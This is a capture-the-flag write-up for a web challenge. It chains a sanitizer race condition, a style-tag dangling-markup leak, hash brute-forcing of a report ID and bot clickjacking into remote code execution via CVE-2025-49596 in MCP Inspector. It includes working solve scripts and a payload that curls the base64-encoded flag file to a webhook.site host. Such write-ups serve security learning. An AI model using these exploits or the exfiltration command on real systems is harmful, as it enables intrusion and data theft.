Looking at the provided challenge source, there are 4 services: 

```yaml:docker-compose.yml
version: "3.8"

services:
  main:
    build: ./web
    ports:
      - "1337:1337"
...

  redis:
    image: redis:7-alpine
...

  bot:
    build: ./bot
...

  mcp-server:
    build: ./mcp-server
...
```

All these services are on the same network, however only `main` is exposed on port 1337. 

![](/idek25/ctfinder-preview.png)

# RCE on mcp-server

The codebase is pretty large, so I decided to work backwards. The flag is in `/app/flag.txt` on mcp-server. It is not referenced anywhere else in the code, leading me to believe we either need LFI or RCE on this container.

I began by checking for package vulnerabilities with snyk (I do this everytime there's a challenge with external packages, to get known CVEs out of the way):

```plaintext
$ python -m venv venv
$ source venv/bin/activate
$ pip install -r requirements.txt
$ snyk test --file=requirements.txt
```

This yielded no results, so I continued on to server.py. As expected, it's a FastAPI MCP server that provides tools to scrape ctftime.org. But to make a long story short, I did not find any vulnerabilities that could lead to RCE. This was until I took a closer look at the Dockerfile, and found a (somewhat) sneakily hidden command on the last line:

```Dockerfile
...
CMD ["bash", "-c", "echo 'Starting MCP Inspector for debugging...' && export npm_config_cache=/tmp/.npm-cache && mkdir -p /tmp/.npm-cache && npx @modelcontextprotocol/inspector@0.13.0 python server.py"]
```

`@modelcontextprotocol/inspector` introduces itself as " a developer tool for testing and debugging MCP servers". More importantly, it has a known RCE vulnerability for versions `<0.14.1`: [CVE-2025-49596](https://nvd.nist.gov/vuln/detail/CVE-2025-49596). I looked through this [blog post](https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596) to get an idea of how it works, but the important part was just this url:

```plaintext
http://0.0.0.0:6277/sse?transportType=stdio&command=touch&args=%2Ftmp%2Fexploited-from-the-browser
```

The exploit is pretty self explanatory, we just need the server to send a GET request to this endpoint, specifying the desired `command` and `args` parameters.

# Finding the XSS source

With the endpoint in mind, I went back to the `web` folder. The `bot` container sounds like the perfect candidate to achieve such SSRF, so I looked for a way to access it from the public web interface. My search led me to the /report endpoint:

```python:web/sessions/routes.py
@session_bp.route('/<session_id>/report', methods=['GET'])
@login_required
@token_required
def get_report(session_id):
    user_id = flask_session['user_id']

    redis = get_redis()
    report = redis.get(f"session:{session_id}:{user_id}:report")

    if not report:
        return jsonify({'error': 'No report found'}), 404

    url = f"http://bot:5010/?session_id={session_id}&user_id={user_id}"
    res = requests.get(url)

    if res.json().get('message') != "Bot visited the URL":
        return jsonify({'error': 'Failed to get report'}), 400
    
    redis.delete(f"session:{session_id}:{user_id}:report")

    return jsonify({'message': 'Report sent'}), 200
```

However, before making any request, we need the `session:{session_id}:{user_id}:report` key to be set in redis. It's set in only one place: `stream_claude_response`:

```python:web/sessions/stream.py
def stream_claude_response(app, session_id, user_id, content, parent_message_id, stream_channel):
    with app.app_context():
        ...

        response = requests.post(
            "https://api.anthropic.com/v1/messages",
            headers=headers,
            json=request_body,
            stream=True
        )
        
        if not response.ok:
            ...
            
            redis.set(f"session:{session_id}:{user_id}:report", json.dumps({
                "event": "error",
                "meta": json.loads(redis.get(stream_channel.replace('stream', 'meta'))),
                "message_id": assistant_message_id,
                "message": error_message
            }))

...
```

The function calls the claude API to get the LLM's response, and creates the report key in event of an error. It is referenced in only one location: 

```python:web/sessions/routes.py
@session_bp.route('/<session_id>/messages', methods=['POST'])
@login_required
@token_required
def create_message(session_id):
    ...

    # this sanitizer part will be discussed later
    sanitizer = Sanitizer(content)  # content = request.get_json().get('content')

    if sanitizer.check(session_id, user_id):
        content = sanitizer.sanitize()
    
    ...

    thread = threading.Thread(
        target=stream_claude_response,
        args=(current_app._get_current_object(), session_id, user_id, content, message_id, stream_channel)
    )

    thread.daemon = True
    thread.start()

...
```

So we need to create a message that triggers a claude API error. Luckily, this is quite easy to do by simply providing an invalid API key. (Recall that the challenge description stated you don't need a valid claude API key.) Thereafter, we can report the session and trigger the bot.

Note that in the code above, there is also some sanitization done, the first of a few hurdles we will have to overcome to obtain XSS.

Once triggered, the bot will visit the `/session/{session_id}` endpoint:

```javascript:bot/bot.js
app.get('/', async (req, res) => {
  const session_id = req.query.session_id;
  const user_id = req.query.user_id;

  console.log(`session_id = "${session_id}"`);
  console.log(`user_id = "${user_id}"`);

  if (!session_id || !user_id) {
    return res.status(400).json({ error: 'session_id and user_id are required' });
  }

  const report_id = crypto
    .createHash('sha256')
    .update(`${session_id}:${user_id}:${REPORT_KEY}`)
    .digest('hex')
    .slice(0, 7);
  const url = `http://main:1337/sessions/${session_id}?user_id=${user_id}&report_id=${report_id}`;

  await visit(url, report_id);

  res.json({ message: 'Bot visited the URL' });
});
```

In the visit function, we see a second hurdle:

```javascript:bot/bot.js
const visit = async (url, report_id) => {
    // ... setting up the browser and signing in ...
    // ... navigating to the url ...

    await page.evaluate(() => {
      document.querySelectorAll('meta[http-equiv]').forEach((el) => {
        if (el.getAttribute('http-equiv').toLowerCase() === 'refresh') {
          el.remove();
        }
      });
      window.stop();
    });

    await page.waitForTimeout(2000);

    await page.evaluate((report_id) => {
      document.querySelector(`#checkReportBtn-${report_id}`).click();
    }, report_id);

    // ... logging out and tearing down ...
}
```

The first part thwarts a well-known technique of using meta tags to navigate to another page: `<meta http-equiv="refresh" content="0;url=http://attacker.site" />`. The second part looks more useful, and could be a clickjacking sink (it is in fact used later on).

Based on the sanitization checks in `create_message`, I assumed that our XSS source would be in the message content. To verify this, I restarted the container with sanitization disabled and verified that I was able to use that to inject arbitrary elements into the DOM.

> The content is dynamically loaded on the client side using innerHTML. You can read the code in `web/templates/session.html` to see exactly where this happens, but it's not very interesting so I'm leaving it out.

# Overcoming Sanitizer

Let's have a look at the first obstacle: `Sanitizer`

```python:web/sessions/sanitizer.py
import time
import bleach
import hashlib

sanitize_store = {}

class Sanitizer:
    def __init__(self, content: str):
        self.content = content

    def generate_key(self, session_id, user_id):
        global sanitize_store
        nonce = self.content[:128]
        timestamp = int(time.time())
        key = f"{session_id}:{user_id}:{nonce}:{timestamp}"
        hash = hashlib.sha256(key.encode()).hexdigest()

        return hash
    
    def check(self, session_id, user_id):
        global sanitize_store
        
        hash = self.generate_key(session_id, user_id)
        
        if hash in sanitize_store:
            return sanitize_store[hash]
    
        bad_chars = ['<', '>', '=', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '[', ']', '{', '}', '|', '\\', '/', '?', ':', ';', '.', ',', '\'', '\"', '`', '~']

        for char in bad_chars:
            if char in self.content:
                sanitize_store[hash] = True
                return True
        
        sanitize_store[hash] = False
        return False
    
    def sanitize(self):
        allowed_tags = ['p', 'strong', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'code']
        allowed_attrs = {
            '*': ['class']
        }

        return bleach.clean(self.content, tags=allowed_tags, attributes=allowed_attrs)
```

Recall that sanitizer is used as follows:

```python
sanitizer = Sanitizer(content)

if sanitizer.check(session_id, user_id):
    content = sanitizer.sanitize()
```

From a first glance, `bad_chars` is an extremely strict blacklist and seemingly impossible to bypass. We could try to find a vulnerability in `bleach.clean`, however there is the glaringly suspicious `satinize_store`, which acts as a cache of sorts for `sanitizer.check` results.

Looking at `generate_key`, we can see that cache keys only check the first 128 characters of the payload, and the current time in seconds. Thus, if we first send a message with 128 characters that passes the check, it will be recorded as "clean". If we then send another message in the same second, with the same first 128 characters, we can append our XSS payload to the back, and it will still pass the sanitizer check due to the key collision.

I wrote a python script for this:

```python:s.py
import requests
import random
import time
from threading import Thread

url = 'http://127.0.0.1:1337'

sess = requests.Session()

# sess.post(url + '/auth/register', json={'username': 'a', 'password': 'a'})
sess.post(url + '/auth/login', json={'username': 'a', 'password': 'a'})

resp = sess.post(url + '/tokens', json={'token': random.randbytes(10).hex()})
print(resp.text)

resp = sess.post(url + '/sessions/')
print(resp.text)
sid = resp.json()['session_id']

# race condition to bypass sanitizer

payload = '<script>alert(1)</script>'

def send_message(sess: requests.Session, sid: str, content: str):
    resp = sess.post(url + f'/sessions/{sid}/messages', json={'content': content})
    print(resp.text)

a = Thread(target=send_message, args=(sess, sid, 'A' * 128))
b = Thread(target=send_message, args=(sess, sid, 'A' * 128 + payload))

a.start()
time.sleep(0.1)
b.start()

a.join()
b.join()
```

Running this and inspecting the resulting session in the browser, I confirmed the script tag was successfully inserted into the DOM. However, it doesn't run due to CSP.

# CSP & clickjacking

The app has a rather strict CSP:

```python:web/app.py
@app.after_request
def add_security_headers(response):
    nonce = getattr(g, 'csp_nonce', '')
    csp_policy = (
        "default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}' https://cdn.tailwindcss.com; "
        "style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; "
        "font-src 'self' https://cdnjs.cloudflare.com; "
        "img-src 'self'; "
        "connect-src 'self'; "
        "media-src 'self'; "
        "worker-src 'self'; "
        "child-src 'none'; "
        "frame-src 'none'; "
        "object-src 'none'; "
        "base-uri 'self'; "
        "form-action 'self'; "
        "frame-ancestors 'none'; "
    )

    response.headers['Content-Security-Policy'] = csp_policy
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    return response
```

Almost all standard techniques are blocked - iframes, object tags, embed tags, base tags. However, `style-src 'unsafe-inline'` looked interesting.

Remembering that the bot does a single click (`document.querySelector(``#checkReportBtn-${report_id}``).click();`), I realised if we inject a link with the same element id, the bot would click our link instead (since it appears before the real button in the DOM), redirecting to wherever we desire. The problem is that `report_id` is unknown, generated as follows (`REPORT_KEY` is an unknown environment variable):

```javascript
  const report_id = crypto
    .createHash('sha256')
    .update(`${session_id}:${user_id}:${REPORT_KEY}`)
    .digest('hex')
    .slice(0, 7);
```

But notice that `report_id` stays consistent for the same session. If we are able to somehow leak the value, we can create a new report in the same session, with the correct element id and thus redirect the bot.

I experimented with ideas to do [blind CSS exfiltration](https://portswigger.net/research/blind-css-exfiltration). `default-src 'self'` blocks almost all cross-origin network connections without javascript, but it doesn't block DNS prefetching. With this in mind I tried exfiltrating with `<link rel="dns-prefetch" href="http://attacker.site">` and [interactsh](https://github.com/projectdiscovery/interactsh), but it didn't work because DNS prefetching is done immediately after the tag is parsed, way before any styles are applied.

I also scoured the app's API routes for possible exfiltration points, but none of them worked.

# Admin routes

Finally, I took a look into `session.html`. It's a big file at 960 lines, and I was hoping there would be something useful inside.

```html
<script nonce="{{ g.csp_nonce }}">
    // ... initialising variables ...

    document.addEventListener('DOMContentLoaded', async function() {
        await checkAuth();
        loadInitialData(); // insert message content into the DOM
        setupEventListeners();
        setupLazyLoading();
        
        if (INITIAL_USER_DATA && INITIAL_USER_DATA.is_admin) {
            await saveReportLog();
        }
    });
```

Starting from the main script initialization, I looked through all the functions. Most of them were unremarkable, but `saveReportLog` was different.

```javascript
async function saveReportLog() {
    const allMessages = messagesContainer.querySelectorAll('.message.user, .message-pair');
    let userMessage = null;
    
    for (let i = allMessages.length - 1; i >= 0; i--) {
        const messageElement = allMessages[i];
        
        if (messageElement.classList.contains('user')) {
            const proseContent = messageElement.querySelector('.prose');
            if (proseContent) {
                userMessage = proseContent.innerHTML.trim();
                break;
            }
        }
        
        if (messageElement.classList.contains('message-pair')) {
            const userDiv = messageElement.querySelector('.justify-end .prose');
            if (userDiv) {
                userMessage = userDiv.innerHTML.trim();
                break;
            }
        }
    }

    if (!userMessage) {
        console.warn('No user message found to save report log');
        return;
    }

    userMessage = userMessage
        .replace(/\n/g, '')
        .replace(/\r/g, '')
        .replace(/\t/g, '')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');

    try {
        const response = await fetch(`/admin/sessions/${currentSessionId}/report`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: 'same-origin',
            body: JSON.stringify({
                report_message: userMessage,
                reporter_id: INITIAL_USER_DATA.user_id
            })
        });
        
        if (response.ok) {
            console.log('Report log saved');
        } else {
            console.warn('Report log save failed:', response.status);
        }
    } catch (error) {
        console.error('Admin check error:', error);
    }
}
```

Essentially, it selects an element based on its classes, and posts the contents to `/admin/sessions/${currentSessionId}/report`.

Until now, the `/admins` routes of the app have never been used. It has only two endpoints, one to post reports, and one to get reports. Conveniently, the GET endpoint does not require admin!

```python:web/admins/routes.py
@admin_bp.route('/sessions/<session_id>/report', methods=['GET'])
@login_required
def get_report_log(session_id):
    user_id = flask_session['user_id']
    is_admin = flask_session['is_admin']

    db = get_db()
    report_logs = db.execute('SELECT * FROM report_logs WHERE session_id = ?', (session_id,)).fetchall()

    if not report_logs:
        return jsonify({'error': 'No report logs found'}), 404

    report_logs_json = []

    for report_log in report_logs:
        if report_log['user_id'] == user_id or is_admin:
            report_logs_json.append({
                'id': report_log['id'],
                'user_id': report_log['user_id'],
                'session_id': report_log['session_id'],
                'message_id': report_log['message_id'],
                'report_message': report_log['report_message'] if is_admin else "Cannot view report message"
            })

    return jsonify({'report_logs': report_logs_json}), 200

@admin_bp.route('/sessions/<session_id>/report', methods=['POST'])
@login_required
def save_report_log(session_id):
    user_id = flask_session['user_id']
    is_admin = flask_session['is_admin']

    if not is_admin:
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json()

    report_message = data.get('report_message')
    reporter_id = data.get('reporter_id')

    if not report_message or not reporter_id:
        return jsonify({'error': 'report_message and reporter_id are required'}), 400

    report_message = report_message.replace('\n', '').replace('\r', '').replace('\t', '').replace('<', '&lt;').replace('>', '&gt;')
    message_id = hashlib.sha256(report_message.encode()).hexdigest()

    db = get_db()
    existing_report = db.execute('SELECT id FROM report_logs WHERE report_message = ? AND user_id = ?', (message_id, reporter_id)).fetchone()

    if existing_report:
        return jsonify({'error': 'Report already exists'}), 400
    
    db.execute('INSERT INTO report_logs (id, user_id, admin_id, session_id, message_id, report_message) VALUES (?, ?, ?, ?, ?, ?)', (str(uuid.uuid4()), reporter_id, user_id, session_id, message_id, report_message))
    db.commit()

    return jsonify({'message': 'Report saved'}), 200
```

If we could somehow include our `report_id` inside the admin report, then perhaps it could be exfiltrated. But how do we encapsulate the report button in an element we control?

# Exfiltrating report_id

A `<style>` tag achieves exactly that. When the html parser encounters a `<style>` tag, it consumes all characters until it encounters the closing tag `</style>`. Thus, all other closing tags are ignored and it is able to gobble up large parts of the DOM. I thereby came up with the payload:

```html
<div class="message user"><div class="prose"><style>
```

The dangling markup is automatically closed by the `innerHTML` setter, at the end of `.message-pair`.

```javascript:web/templates/session.html
function createMessagePairElement(pair) {
    const pairElement = document.createElement('div');
    pairElement.className = 'message-pair space-y-4';
    
    let pairHTML = '';
    
    if (pair.user) {
        // our injection point
        pairHTML += createSingleMessageHTML(pair.user.role, pair.user.content);
    }
    
    if (pair.assistant) {
        // this part contains report_id
        pairHTML += createSingleMessageHTML(pair.assistant.role, pair.assistant.content);
    }
    
    pairElement.innerHTML = pairHTML;
    return pairElement;
}
```

The resulting DOM looks like this (signed in as a user):

```html
<div class="message user"><div class="prose"><style>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            
                <div class="flex justify-start">
                    <div class="flex max-w-[80%] flex-row items-start space-x-3">
                        <div class="w-8 h-8 rounded-full flex items-center justify-center bg-claude-orange mr-3">
                            <i class="fas fa-robot text-white text-sm"></i>
                        </div>
                        <div class="flex-1">
                            <div class="bg-white border border-gray-200 rounded-2xl rounded-tl-md px-4 py-3">
                                <div class="prose prose-sm max-w-none text-gray-800">
                                    <div class="text-red-500">
                                            <p>
                                                <strong>An error occurred.</strong>
                                                <br>
                                                Claude API Error: HTTP 401 - invalid x-api-key
                                            </p>
                                            <br>
                                            
                                            <button id="reportBtn" class="bg-red-500 text-white px-4 py-2 rounded-md">
                                                Report Session
                                            </button>
                                            
                                            <br><br>
                                            <p class="text-sm">
                                                <strong>'You cannot send new messages until you report.'</strong>
                                            </p>
                                            </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </style></div></div>
```

I reported this session and checked `/admin/sessions/{session_id}/report`:

```json
{
    "report_logs": [
        {
            "id": "ee461e60-9b19-4f84-907e-55a9721d5915",
            "message_id": "fb9bd397cf361cb6ae9a79f60682980e0feb426cc7fdc5ce9366528cec8db942",
            "report_message": "Cannot view report message",
            "session_id": "23d902f7-b3ac-41e4-b3d4-63088b7b535b",
            "user_id": "654a6a03-6764-4e77-8f28-2921ac275bb6"
        }
    ]
}
```

Here's one last hurdle: the report content is censored from non-admins. But take another look at how `message_id` is generated during admin report creation:

```python:web/admins/routes.py

@admin_bp.route('/sessions/<session_id>/report', methods=['POST'])
@login_required
def save_report_log(session_id):
    ...
    message_id = hashlib.sha256(report_message.encode()).hexdigest()
    ...
```

`message_id` is the sha256 digest of the message contents. Since `report_id` is the only part that changes in the message, we can brute force those 3.5 bytes until we find the matching hash. I wrote a python script to do this (takes around 12 minutes to run in the worst case):

```python:b.py
import hashlib

for i in range(16 ** 7):
    rid = hex(i)[2:].rjust(7, '0')
    s = f"&lt;style&gt;                                &lt;/div&gt;                            &lt;/div&gt;                        &lt;/div&gt;                    &lt;/div&gt;                &lt;/div&gt;                            &lt;div class=\"flex justify-start\"&gt;                    &lt;div class=\"flex max-w-[80%] flex-row items-start space-x-3\"&gt;                        &lt;div class=\"w-8 h-8 rounded-full flex items-center justify-center bg-claude-orange mr-3\"&gt;                            &lt;i class=\"fas fa-robot text-white text-sm\"&gt;&lt;/i&gt;                        &lt;/div&gt;                        &lt;div class=\"flex-1\"&gt;                            &lt;div class=\"bg-white border border-gray-200 rounded-2xl rounded-tl-md px-4 py-3\"&gt;                                &lt;div class=\"prose prose-sm max-w-none text-gray-800\"&gt;                                    &lt;div class=\"text-red-500\"&gt;                                            &lt;p&gt;                                                &lt;strong&gt;An error occurred.&lt;/strong&gt;                                                &lt;br&gt;                                                Claude API Error: HTTP 401 - invalid x-api-key                                            &lt;/p&gt;                                            &lt;br&gt;                                                                                        &lt;button id=\"checkReportBtn-{rid}\" class=\"bg-red-500 text-white px-4 py-2 rounded-md\"&gt;                                                Check Report {rid}                                            &lt;/button&gt;                                            &lt;br&gt;&lt;br&gt;                                            &lt;p class=\"text-sm\"&gt;                                                &lt;strong&gt;'You cannot send new messages until you report.'&lt;/strong&gt;                                            &lt;/p&gt;                                            &lt;/div&gt;                                &lt;/div&gt;                            &lt;/div&gt;                        &lt;/div&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/style&gt;"
    if i % 1_000_000 == 0:
        print(i, round(i * 100 / (16 ** 7), 2))
    if hashlib.sha256(s.encode()).hexdigest() == 'fb9bd397cf361cb6ae9a79f60682980e0feb426cc7fdc5ce9366528cec8db942':
        print(rid)
        break
```

```plaintext:output
...
34b3da7
```

With that, we've managed to leak report_id. Create a second message in the same session with a link to the RCE endpoint, with the desired command:

```html
<a id="checkReportBtn-34b3da7" href="http://mcp-server:6277/sse?transportType=stdio&command=sh&args=-c%20%22curl%20https%3A//webhook.site/2c7d64f3-cd0a-42a5-8b32-b95e3f6b19aa%3Ff%3D%60cat%20/app/flag.txt%20%7C%20base64%20-w%200%60%22" />
```

Thereafter, I got the flag locally.

# Solve script

On remote, threading+requests wasn't winning the race condition to bypass `Sanitizer` (I don't know why) but I got it working with `grequests`. Since it only worked half the time, I split my solve into two scripts. After running the first script I would manually check if the payload was successfully inserted, and once it worked I send the report. Then I copied the `message_id` and ran my hash cracker (I should probably have preemptively generated a mapping of all possible hashes beforehand, since I had to retry my exploit multiple times and this part took quite long to run). Once I got the correct `report_id`, I copied it over to the second script which inserts the malicious link.

```python:s0.py
import grequests
import requests
import time
import random

url = 'http://127.0.0.1:1337'
url = 'https://ctfinder-3d264a71099b40be.instancer.idek.team'
username = 'a'

sess = requests.Session()

sess.post(url + '/auth/register', json={'username': username, 'password': 'a'})
sess.post(url + '/auth/login', json={'username': username, 'password': 'a'})

resp = sess.post(url + '/tokens', json={'token': random.randbytes(10).hex()})
print(resp.text)

resp = sess.post(url + '/sessions/')
print(resp.text)
sid = resp.json()['session_id']

# race condition to bypass sanitizer

# exfiltrate report id with css
payload = '<div class="message user"><div class="prose"><style>'

auth_sess = sess.cookies.get('session')
reqs = []
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128}, headers={'Cookie': 'session=' + auth_sess}))
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128 + payload}, headers={'Cookie': 'session=' + auth_sess}))

resps = grequests.map(reqs)
for resp in resps:
    print(resp.text)

print(sid)
```

```python:s1.py
import grequests
import requests
from urllib.parse import quote

url = 'http://127.0.0.1:1337'
url = 'https://ctfinder-3d264a71099b40be.instancer.idek.team'
username = 'z'
sid = 'edc5a1e1-9463-4444-a138-a53c98cba650'
report_id = 'fe0a001'

sess = requests.Session()

sess.post(url + '/auth/login', json={'username': username, 'password': 'a'})

args = '-c "curl https://webhook.site/2c7d64f3-cd0a-42a5-8b32-b95e3f6b19aa?f=`cat /app/flag.txt | base64 -w 0`"'
args = quote(args)
print(args)

payload = f'<a id="checkReportBtn-{report_id}" href="http://0.0.0.0:6277/sse?transportType=stdio&command=sh&args={args}" />'

auth_sess = sess.cookies.get('session')
reqs = []
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128}, headers={'Cookie': 'session=' + auth_sess}))
reqs.append(grequests.post(url + f'/sessions/{sid}/messages', json={'content': 'A' * 128 + payload}, headers={'Cookie': 'session=' + auth_sess}))

resps = grequests.map(reqs)
for resp in resps:
    print(resp.text)

print(sid)
```

A few seconds after reporting the second message, I got the webhook notification and decoded the flag:

`idek{78a750a47c1a4350a0f528b63293dc05f3c9afcee09bbb0f85b5b2d13b537b95}`

# Closing thoughts

I was quite happy with this solve. This challenge consisted of many smaller parts which in isolation aren't that hard, but with a  large codebase its easy to get lost or stuck down a rabbit hole. I found it helpful to follow the signposts (e.g. button click in the bot, existence of admin routes) whenever I was stumped.